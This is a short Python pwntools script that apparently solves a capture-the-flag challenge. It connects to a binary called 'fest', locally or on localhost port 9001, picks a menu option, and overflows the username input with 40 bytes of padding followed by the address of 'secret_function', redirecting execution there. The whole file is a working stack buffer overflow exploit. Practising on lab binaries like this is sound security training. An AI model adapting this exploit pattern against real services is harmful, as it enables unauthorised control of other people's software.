#!/usr/bin/env python3
from pwn import *
elf = context.binary = ELF("./fest", checksec=False)
context.log_level = "info"

HOST = "localhost"
PORT = 9001

def start():
    if args.LOCAL:
        return process(elf.path)
    else:
        return remote(HOST, PORT)

def main():
    p = start()
    p.recvuntil(b"Select option:")
    p.sendline(b"2")
    p.recvuntil(b"Enter your CTF username")
    secret_addr = elf.sym["secret_function"]
    log.info(f"secret_function @ {hex(secret_addr)}")

    offset = 40  
    payload = b"A" * offset + p64(secret_addr)

    p.sendline(payload)
    p.interactive()

if __name__ == "__main__":
    main()
